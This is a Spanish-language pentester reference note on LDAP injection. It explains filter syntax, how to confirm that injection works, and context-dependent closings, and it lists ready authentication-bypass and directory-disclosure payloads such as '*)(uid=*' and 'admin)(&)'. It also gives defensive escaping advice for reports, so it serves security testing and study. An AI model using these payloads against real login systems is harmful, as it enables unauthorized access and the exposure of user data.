---
tipo: meta
aliases:
  - payloads LDAP
  - LDAP filter syntax
  - LDAP auth bypass payloads
tags:
  - meta/referencia
  - dominio/web
---

# LDAP filtro - matriz de referencia

> [!info] Referencia pura, no un zettel
> La sintaxis del filtro y los payloads por contexto. La extracción ciega está en [[LDAP extracción ciega - matriz de referencia]]; el criterio, en [[MOC - LDAP injection]].

## 0. La sintaxis, en una tabla

El filtro es notación prefija: operador adelante, términos entre paréntesis.

| Elemento | Significa |
|---|---|
| `(atributo=valor)` | Igualdad. `valor` puede llevar `*` |
| `&` | Y — `(&(a=1)(b=2))` |
| `\|` | O — `(\|(a=1)(b=2))` |
| `!` | NO — `(!(a=1))` |
| `*` | Comodín: cualquier cosa |
| `(&)` | Filtro absoluto verdadero |
| `(\|)` | Filtro absoluto falso |
| `>=` `<=` `~=` | Mayor/menor/aproximado |

Romper el filtro = cerrar paréntesis y agregar la lógica propia.

## 1. Confirmar la inyección

Meter un metacarácter y ver si el filtro se rompe o cambia:

`*`  → si amplía el resultado, la entrada llega sin escapar
`)`  → si da error de filtro mal formado, se puede cerrar
`(`  → igual
`\`  → escape; si cambia algo, hay interpretación

Un `*` que devuelve más resultados de los esperados es la confirmación más limpia.

## 2. Salto de autenticación

Filtro supuesto de login: `(&(uid=USER)(userPassword=PASS))`

**Comodín en la contraseña:**
```
USER = admin      PASS = *
→ (&(uid=admin)(userPassword=*))    entra si admin existe
```

**Cerrar y anular la contraseña, inyectando en el usuario:**
```
USER = admin)(&)
→ (&(uid=admin)(&))(userPassword=PASS))    (&) siempre verdadero
```
```
USER = admin)(!(&(1=0
→ variantes que cierran y neutralizan
```

**Sin conocer el usuario:**
```
USER = *)(uid=*      PASS = *
→ (&(uid=*)(uid=*))(userPassword=*))    primer usuario del directorio
```
```
USER = *)(|(uid=*
```

**Lista de payloads de bypass** (uno por línea, probar en orden):

`*`
`*)(uid=*`
`*)(uid=*))(|(uid=*`
`admin)(&)`
`admin)(!(&(1=0`
`admin))(|(|`
`*)(objectClass=*`
`admin*`

## 3. Convertir Y en O — ampliar el resultado

Si el filtro usa `&` y se puede inyectar la estructura, cambiar la lógica para devolver de más:

```
USER = *)(|(uid=*
→ (&(uid=*)(|(uid=*)(userPassword=...)))    afloja la conjunción
```

Devolver todos los objetos, para divulgación de directorio:

```
*)(objectClass=*
```

## 4. Contexto — dónde cae la entrada

El payload depende de qué hay alrededor de la inyección:

| Filtro original | Dónde inyecto | Cierre necesario |
|---|---|---|
| `(uid=INPUT)` | valor único | `*` o `X)(inject` |
| `(&(uid=INPUT)(pass=X))` | primer término | `X)(&)` para anular el segundo |
| `(&(pass=X)(uid=INPUT))` | último término | `*` suele bastar |
| `(\|(uid=INPUT)(...))` | dentro de un O | `*)(uid=*` |
| DN de bind `uid=INPUT,ou=users` | el DN | escape distinto, ver § 6 |

La forma del filtro casi nunca se ve: se infiere probando qué cierre hace funcionar la inyección.

## 5. Divulgación de atributos cuando se refleja

Si la búsqueda devuelve resultados en la respuesta, pedir atributos de más ampliando el filtro con `*` en un `objectClass=*` o forzando que devuelva todo. Lo que aparece —`mail`, `memberOf`, `userPassword` si está mal protegido, `description`— es el premio.

## 6. Inyección en el DN

Cuando la entrada arma el nombre distinguido del bind, no un filtro:

`uid=INPUT,ou=users,dc=corp,dc=com`

El escape es distinto —`,`, `=`, `+`, `<`, `>`, `#`, `;`— y el objetivo es cambiar la rama del árbol contra la que se autentica. Es más raro y más específico del despliegue; se prueba cuando el bind usa el DN directo.

## 7. Escape — lo que la defensa debería hacer

Para el informe: los caracteres que hay que escapar en la entrada.

| Carácter | Escape |
|---|---|
| `*` | `\2a` |
| `(` | `\28` |
| `)` | `\29` |
| `\` | `\5c` |
| nulo | `\00` |
| `/` | `\2f` |

Si la aplicación escapa estos, el dominio se cierra. Recomendar el escape **o** las consultas parametrizadas.

## 8. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| El `*` no amplía nada | La entrada se escapa. Rama cerrada |
| Error de filtro mal formado | Se puede inyectar estructura; ajustar los paréntesis |
| El comodín en pass no entra | La app hace bind con la contraseña, no solo búsqueda |
| El bypass funciona pero no da admin | Devolvió el primer usuario, no admin. Afinar con `uid=admin*` |
| `*)(uid=*` no cierra bien | Contar los paréntesis del filtro original; probar variantes de § 2 |
| Todo devuelve error | Puede haber validación de formato del `uid`. Buena mitigación |

## Relacionadas

[[MOC - LDAP injection]] · [[LDAP extracción ciega - matriz de referencia]] · [[LDAP - manipulación del filtro]] · [[AD enumeración - matriz de referencia]]
